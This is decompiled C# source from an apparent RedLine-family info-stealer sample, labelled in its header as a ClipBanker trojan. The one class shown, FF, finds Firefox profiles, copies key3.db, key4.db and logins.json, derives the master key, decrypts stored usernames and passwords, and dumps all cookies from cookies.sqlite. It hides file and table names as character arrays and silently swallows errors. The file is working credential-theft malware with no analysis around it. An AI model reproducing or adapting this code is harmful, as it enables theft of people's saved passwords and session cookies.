// Decompiled with JetBrains decompiler
// Type: FtpClient.Data.Browsers.Gecko.FF
// Assembly: Baignoire, Version=12.5.1.3, Culture=neutral, PublicKeyToken=null
// MVID: 0AA7C5E4-9380-4A35-BE75-5D7E722D7BE8
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\HEUR-Trojan-Banker.MSIL.ClipBanker.gen-4d94148f1dff68b03896e3fa5508c5b039b0a29b1fd90db01884137f2e9495a4.exe

using FtpClient.Data.Extensions;
using FtpClient.Data.Helpers;
using FtpClient.Models.Browsers;
using FtpClient.Models.Gecko;
using FtpClient.Models.Info;
using RedLine.Client.Models.Gecko;
using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;

namespace FtpClient.Data.Browsers.Gecko
{
  public static class FF
  {
    public static List<InfoClass12> Get(IList<string> paths)
    {
      List<InfoClass12> infoClass12List = new List<InfoClass12>();
      try
      {
        foreach (string path in (IEnumerable<string>) paths)
        {
          try
          {
            string fullName = new FileInfo(path).Directory.FullName;
            string str = path.Contains(FtpClient.Data.Helpers.Constants.RoamingAppData) ? FF.GeckoRoamingName(fullName) : FF.GeckoLocalName(fullName);
            if (!string.IsNullOrEmpty(str))
            {
              List<InfoClass4> infoClass4List = FF.EnumPasswords(fullName);
              InfoClass12 infoClass12 = new InfoClass12()
              {
                Object1 = str,
                Object2 = new DirectoryInfo(fullName).Name,
                Object6 = (IList<InfoClass13>) new List<InfoClass13>((IEnumerable<InfoClass13>) FF.EnumCook(fullName)).IsNull<List<InfoClass13>>(),
                Object3 = (IList<InfoClass4>) new List<InfoClass4>((IEnumerable<InfoClass4>) infoClass4List.IsNull<List<InfoClass4>>()),
                Object4 = (IList<InfoClass11>) new List<InfoClass11>(),
                Object5 = (IList<InfoClass14>) new List<InfoClass14>()
              };
              infoClass12List.Add(infoClass12);
            }
          }
          catch
          {
          }
        }
      }
      catch (Exception ex)
      {
      }
      return infoClass12List;
    }

    private static List<InfoClass4> EnumPasswords(string profile)
    {
      List<InfoClass4> infoClass4List = new List<InfoClass4>();
      try
      {
        if (File.Exists(Path.Combine(profile, new string(new char[7]
        {
          'k',
          'e',
          'y',
          '3',
          '.',
          'd',
          'b'
        }))))
        {
          bool createdNew;
          string temp = FileSystemHelper.TryCreateTemp(Path.Combine(profile, new string(new char[7]
          {
            'k',
            'e',
            'y',
            '3',
            '.',
            'd',
            'b'
          })), out createdNew);
          infoClass4List.AddRange((IEnumerable<InfoClass4>) FF.ParseLogins(profile, FF.GetPrivate4Key(temp)));
          if (createdNew)
            File.Delete(temp);
        }
        if (File.Exists(Path.Combine(profile, new string(new char[7]
        {
          'k',
          'e',
          'y',
          '4',
          '.',
          'd',
          'b'
        }))))
        {
          bool createdNew;
          string temp = FileSystemHelper.TryCreateTemp(Path.Combine(profile, new string(new char[7]
          {
            'k',
            'e',
            'y',
            '4',
            '.',
            'd',
            'b'
          })), out createdNew);
          infoClass4List.AddRange((IEnumerable<InfoClass4>) FF.ParseLogins(profile, FF.GetPrivate4Key(temp)));
          if (createdNew)
            File.Delete(temp);
        }
      }
      catch (Exception ex)
      {
      }
      return infoClass4List;
    }

    private static List<InfoClass4> ParseLogins(string profile, byte[] privateKey)
    {
      List<InfoClass4> logins = new List<InfoClass4>();
      try
      {
        if (!File.Exists(Path.Combine(profile, new string(new char[11]
        {
          'l',
          'o',
          'g',
          'i',
          'n',
          's',
          '.',
          'j',
          's',
          'o',
          'n'
        }))))
          return logins;
        bool createdNew;
        string temp = FileSystemHelper.TryCreateTemp(Path.Combine(profile, new string(new char[11]
        {
          'l',
          'o',
          'g',
          'i',
          'n',
          's',
          '.',
          'j',
          's',
          'o',
          'n'
        })), out createdNew);
        foreach (Login login in File.ReadAllText(temp).FromJSON<Logins>().logins)
        {
          Asn1Object asn1Object1 = Asn1Factory.Create(Convert.FromBase64String(login.encryptedUsername));
          Asn1Object asn1Object2 = Asn1Factory.Create(Convert.FromBase64String(login.encryptedPassword));
          string str1 = Regex.Replace(CryptoHelper.Decrypt3DES(privateKey, asn1Object1.Objects[0].Objects[1].Objects[1].ObjectData, asn1Object1.Objects[0].Objects[2].ObjectData, PaddingMode.PKCS7), new string(new char[16]
          {
            '[',
            '^',
            '\\',
            'u',
            '0',
            '0',
            '2',
            '0',
            '-',
            '\\',
            'u',
            '0',
            '0',
            '7',
            'F',
            ']'
          }), string.Empty);
          string str2 = Regex.Replace(CryptoHelper.Decrypt3DES(privateKey, asn1Object2.Objects[0].Objects[1].Objects[1].ObjectData, asn1Object2.Objects[0].Objects[2].ObjectData, PaddingMode.PKCS7), new string(new char[16]
          {
            '[',
            '^',
            '\\',
            'u',
            '0',
            '0',
            '2',
            '0',
            '-',
            '\\',
            'u',
            '0',
            '0',
            '7',
            'F',
            ']'
          }), string.Empty);
          InfoClass4 infoClass4 = new InfoClass4()
          {
            Object1 = string.IsNullOrEmpty(login.hostname) ? "UNKNOWN" : login.hostname,
            Object2 = string.IsNullOrEmpty(str1) ? "UNKNOWN" : str1,
            Object3 = string.IsNullOrEmpty(str2) ? "UNKNOWN" : str2
          };
          if (infoClass4.Object2 != "UNKNOWN" && infoClass4.Object3 != "UNKNOWN" && infoClass4.Object1 != "UNKNOWN")
            logins.Add(infoClass4);
        }
        if (createdNew)
          File.Delete(temp);
      }
      catch (Exception ex)
      {
      }
      return logins;
    }

    private static byte[] GetPrivate4Key(string file)
    {
      byte[] private4Key = new byte[24];
      try
      {
        if (!File.Exists(file))
          return private4Key;
        SqlConnection sqlConnection = new SqlConnection(file);
        sqlConnection.ReadTable("metaData");
        string s1 = sqlConnection.ParseValue(0, "item1");
        string s2 = sqlConnection.ParseValue(0, "item2)");
        Asn1Object asn1Object1 = Asn1Factory.Create(Encoding.GetEncoding(new string(new char[12]
        {
          'w',
          'i',
          'n',
          'd',
          'o',
          'w',
          's',
          '-',
          '1',
          '2',
          '5',
          '1'
        })).GetBytes(s2));
        byte[] objectData1 = asn1Object1.Objects[0].Objects[0].Objects[1].Objects[0].ObjectData;
        byte[] objectData2 = asn1Object1.Objects[0].Objects[1].ObjectData;
        GeckoPasswordBasedEncryption passwordBasedEncryption1 = new GeckoPasswordBasedEncryption(Encoding.GetEncoding(new string(new char[12]
        {
          'w',
          'i',
          'n',
          'd',
          'o',
          'w',
          's',
          '-',
          '1',
          '2',
          '5',
          '1'
        })).GetBytes(s1), Encoding.GetEncoding(new string(new char[12]
        {
          'w',
          'i',
          'n',
          'd',
          'o',
          'w',
          's',
          '-',
          '1',
          '2',
          '5',
          '1'
        })).GetBytes(string.Empty), objectData1);
        passwordBasedEncryption1.Init();
        CryptoHelper.Decrypt3DES(passwordBasedEncryption1.DataKey, passwordBasedEncryption1.DataIV, objectData2);
        sqlConnection.ReadTable("nssPrivate");
        int rowLength = sqlConnection.RowLength;
        string empty = string.Empty;
        for (int rowIndex = 0; rowIndex < rowLength; ++rowIndex)
        {
          if (sqlConnection.ParseValue(rowIndex, "a102") == Encoding.GetEncoding(new string(new char[12]
          {
            'w',
            'i',
            'n',
            'd',
            'o',
            'w',
            's',
            '-',
            '1',
            '2',
            '5',
            '1'
          })).GetString(FtpClient.Data.Helpers.Constants.Key4MagicNumber))
          {
            empty = sqlConnection.ParseValue(rowIndex, "a11");
            break;
          }
        }
        Asn1Object asn1Object2 = Asn1Factory.Create(Encoding.GetEncoding(new string(new char[12]
        {
          'w',
          'i',
          'n',
          'd',
          'o',
          'w',
          's',
          '-',
          '1',
          '2',
          '5',
          '1'
        })).GetBytes(empty));
        byte[] objectData3 = asn1Object2.Objects[0].Objects[0].Objects[1].Objects[0].ObjectData;
        byte[] objectData4 = asn1Object2.Objects[0].Objects[1].ObjectData;
        GeckoPasswordBasedEncryption passwordBasedEncryption2 = new GeckoPasswordBasedEncryption(Encoding.GetEncoding(new string(new char[12]
        {
          'w',
          'i',
          'n',
          'd',
          'o',
          'w',
          's',
          '-',
          '1',
          '2',
          '5',
          '1'
        })).GetBytes(s1), Encoding.GetEncoding(new string(new char[12]
        {
          'w',
          'i',
          'n',
          'd',
          'o',
          'w',
          's',
          '-',
          '1',
          '2',
          '5',
          '1'
        })).GetBytes(string.Empty), objectData3);
        passwordBasedEncryption2.Init();
        private4Key = Encoding.GetEncoding(new string(new char[12]
        {
          'w',
          'i',
          'n',
          'd',
          'o',
          'w',
          's',
          '-',
          '1',
          '2',
          '5',
          '1'
        })).GetBytes(CryptoHelper.Decrypt3DES(passwordBasedEncryption2.DataKey, passwordBasedEncryption2.DataIV, objectData4, PaddingMode.PKCS7));
      }
      catch
      {
      }
      return private4Key;
    }

    private static byte[] GetPrivate3Key(string file)
    {
      byte[] destinationArray = new byte[24];
      try
      {
        if (!File.Exists(file))
          return destinationArray;
        GeckoDatabase geckoDatabase = new GeckoDatabase(file);
        PasswordCheck passwordCheck = new PasswordCheck(geckoDatabase.GetValue((Func<string, bool>) (x => x.Equals(new string(new char[14]
        {
          'p',
          'a',
          's',
          's',
          'w',
          'o',
          'r',
          'd',
          '-',
          'c',
          'h',
          'e',
          'c',
          'k'
        })))));
        string hexString = geckoDatabase.GetValue((Func<string, bool>) (x => x.Equals(new string(new char[11]
        {
          'g',
          'l',
          'o',
          'b',
          'a',
          'l',
          '-',
          's',
          'a',
          'l',
          't'
        }))));
        GeckoPasswordBasedEncryption passwordBasedEncryption1 = new GeckoPasswordBasedEncryption(CryptoHelper.ConvertHexStringToByteArray(hexString), Encoding.GetEncoding(new string(new char[12]
        {
          'w',
          'i',
          'n',
          'd',
          'o',
          'w',
          's',
          '-',
          '1',
          '2',
          '5',
          '1'
        })).GetBytes(string.Empty), CryptoHelper.ConvertHexStringToByteArray(passwordCheck.EntrySalt));
        passwordBasedEncryption1.Init();
        CryptoHelper.Decrypt3DES(passwordBasedEncryption1.DataKey, passwordBasedEncryption1.DataIV, CryptoHelper.ConvertHexStringToByteArray(passwordCheck.Passwordcheck));
        Asn1Object asn1Object1 = Asn1Factory.Create(CryptoHelper.ConvertHexStringToByteArray(geckoDatabase.GetValue((Func<string, bool>) (x =>
        {
          if (!x.Equals(new string(new char[14]
          {
            'p',
            'a',
            's',
            's',
            'w',
            'o',
            'r',
            'd',
            '-',
            'c',
            'h',
            'e',
            'c',
            'k'
          })))
          {
            if (!x.Equals(new string(new char[7]
            {
              'V',
              'e',
              'r',
              's',
              'i',
              'o',
              'n'
            })))
              return !x.Equals(new string(new char[11]
              {
                'g',
                'l',
                'o',
                'b',
                'a',
                'l',
                '-',
                's',
                'a',
                'l',
                't'
              }));
          }
          return false;
        }))));
        GeckoPasswordBasedEncryption passwordBasedEncryption2 = new GeckoPasswordBasedEncryption(CryptoHelper.ConvertHexStringToByteArray(hexString), Encoding.GetEncoding(new string(new char[12]
        {
          'w',
          'i',
          'n',
          'd',
          'o',
          'w',
          's',
          '-',
          '1',
          '2',
          '5',
          '1'
        })).GetBytes(string.Empty), asn1Object1.Objects[0].Objects[0].Objects[1].Objects[0].ObjectData);
        passwordBasedEncryption2.Init();
        Asn1Object asn1Object2 = Asn1Factory.Create(Asn1Factory.Create(Encoding.GetEncoding(new string(new char[12]
        {
          'w',
          'i',
          'n',
          'd',
          'o',
          'w',
          's',
          '-',
          '1',
          '2',
          '5',
          '1'
        })).GetBytes(CryptoHelper.Decrypt3DES(passwordBasedEncryption2.DataKey, passwordBasedEncryption2.DataIV, asn1Object1.Objects[0].Objects[1].ObjectData))).Objects[0].Objects[2].ObjectData);
        if (asn1Object2.Objects[0].Objects[3].ObjectData.Length > 24)
          Array.Copy((Array) asn1Object2.Objects[0].Objects[3].ObjectData, asn1Object2.Objects[0].Objects[3].ObjectData.Length - 24, (Array) destinationArray, 0, 24);
        else
          destinationArray = asn1Object2.Objects[0].Objects[3].ObjectData;
      }
      catch
      {
      }
      return destinationArray;
    }

    private static List<InfoClass13> EnumCook(string profile)
    {
      List<InfoClass13> infoClass13List = new List<InfoClass13>();
      try
      {
        string str = Path.Combine(profile, new string(new char[14]
        {
          'c',
          'o',
          'o',
          'k',
          'i',
          'e',
          's',
          '.',
          's',
          'q',
          'l',
          'i',
          't',
          'e'
        }));
        if (!File.Exists(str))
          return infoClass13List;
        bool createdNew;
        string temp = FileSystemHelper.TryCreateTemp(str, out createdNew);
        SqlConnection sqlConnection = new SqlConnection(temp);
        sqlConnection.ReadTable(new string(new char[11]
        {
          'm',
          'o',
          'z',
          '_',
          'c',
          'o',
          'o',
          'k',
          'i',
          'e',
          's'
        }));
        for (int rowIndex = 0; rowIndex < sqlConnection.RowLength; ++rowIndex)
        {
          InfoClass13 infoClass13 = (InfoClass13) null;
          try
          {
            infoClass13 = new InfoClass13()
            {
              Object1 = sqlConnection.ParseValue(rowIndex, new string(new char[4]
              {
                'h',
                'o',
                's',
                't'
              })).Trim(),
              Object2 = (sqlConnection.ParseValue(rowIndex, new string(new char[4]
              {
                'h',
                'o',
                's',
                't'
              })).Trim().StartsWith(".") ? 1 : 0) != 0,
              Object3 = sqlConnection.ParseValue(rowIndex, new string(new char[4]
              {
                'p',
                'a',
                't',
                'h'
              })).Trim(),
              Object4 = (sqlConnection.ParseValue(rowIndex, new string(new char[8]
              {
                'i',
                's',
                'S',
                'e',
                'c',
                'u',
                'r',
                'e'
              })).StartsWith("1") ? 1 : 0) != 0,
              Object5 = long.Parse(sqlConnection.ParseValue(rowIndex, new string(new char[6]
              {
                'e',
                'x',
                'p',
                'i',
                'r',
                'y'
              })).Trim()),
              Object6 = sqlConnection.ParseValue(rowIndex, new string(new char[4]
              {
                'n',
                'a',
                'm',
                'e'
              })).Trim(),
              Object7 = sqlConnection.ParseValue(rowIndex, new string(new char[5]
              {
                'v',
                'a',
                'l',
                'u',
                'e'
              }))
            };
          }
          catch
          {
          }
          if (infoClass13 != null)
            infoClass13List.Add(infoClass13);
        }
        if (createdNew)
          File.Delete(temp);
      }
      catch
      {
      }
      return infoClass13List;
    }

    public static string GeckoRoamingName(string profilesDirectory)
    {
      string str = string.Empty;
      try
      {
        profilesDirectory = profilesDirectory.Replace(Environment.ExpandEnvironmentVariables(new string(new char[10]
        {
          '%',
          'a',
          'p',
          'p',
          'd',
          'a',
          't',
          'a',
          '%',
          '\\'
        })), string.Empty);
        string[] strArray = profilesDirectory.Split(new char[1]
        {
          '\\'
        }, StringSplitOptions.RemoveEmptyEntries);
        str = !(strArray[2] == new string(new char[8]
        {
          'P',
          'r',
          'o',
          'f',
          'i',
          'l',
          'e',
          's'
        })) ? strArray[0] : strArray[1];
      }
      catch
      {
      }
      return str;
    }

    public static string GeckoLocalName(string profilesDirectory)
    {
      string str = string.Empty;
      try
      {
        profilesDirectory = profilesDirectory.Replace(Environment.ExpandEnvironmentVariables(new string(new char[15]
        {
          '%',
          'l',
          'o',
          'c',
          'a',
          'l',
          'a',
          'p',
          'p',
          'd',
          'a',
          't',
          'a',
          '%',
          '\\'
        })), string.Empty);
        string[] strArray = profilesDirectory.Split(new char[1]
        {
          '\\'
        }, StringSplitOptions.RemoveEmptyEntries);
        str = !(strArray[2] == new string(new char[8]
        {
          'P',
          'r',
          'o',
          'f',
          'i',
          'l',
          'e',
          's'
        })) ? strArray[0] : strArray[1];
      }
      catch
      {
      }
      return str;
    }
  }
}
